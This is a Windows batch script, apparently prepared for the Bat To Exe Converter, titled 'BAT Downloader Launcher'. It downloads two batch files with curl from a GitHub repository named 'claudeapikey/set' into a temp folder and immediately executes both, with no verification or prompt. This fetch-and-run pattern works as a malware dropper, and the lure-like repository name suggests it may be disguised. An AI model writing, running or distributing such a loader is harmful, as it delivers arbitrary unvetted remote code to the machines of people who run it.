::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdFy5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdFy5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAhVQg6bAES0A5EO4f7+086CsUYJW/IDa5bIzrGDc7Jd713hFQ==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal
title BAT Downloader Launcher

set "DEST=%TEMP%\MyScripts"
if not exist "%DEST%" mkdir "%DEST%"

echo Downloading first BAT file...
curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/pritam.bat" -o "%DEST%\first.bat"
if errorlevel 1 goto error

echo Downloading second BAT file...
curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/bhaiyya.bat" -o "%DEST%\second.bat"
if errorlevel 1 goto error

echo Running first BAT...
call "%DEST%\first.bat"
if errorlevel 1 goto error

echo Running second BAT...
call "%DEST%\second.bat"
if errorlevel 1 goto error

exit /b 0

:error
echo An operation failed. Error code: %errorlevel%
exit /b 1